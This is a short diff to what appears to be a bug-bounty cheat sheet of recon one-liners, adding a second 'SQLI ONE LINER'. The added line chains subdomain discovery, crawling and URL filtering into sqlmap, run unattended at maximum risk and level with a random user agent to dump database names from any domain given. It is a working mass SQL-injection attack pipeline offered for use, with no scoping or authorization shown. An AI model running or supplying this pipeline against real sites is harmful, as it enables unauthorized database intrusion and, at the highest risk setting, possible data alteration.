@@ -5,6 +5,7 @@ Twitter :- https://twitter.com/dpakmrya LinkedIn :-https://www.linkedin.com/in/d
 
 SQLI ONE LINER :-
 subfinder -d testpho.com -all -silent | gau | urldedupe | gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent | tee -a sqli.txt
+subfinder -d domain.com -all -silent | hakrawler | urldedupe | gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 3 --level 5 --random-agent | tee -a sqli.txt 
 
 Recon :-
 subfinder
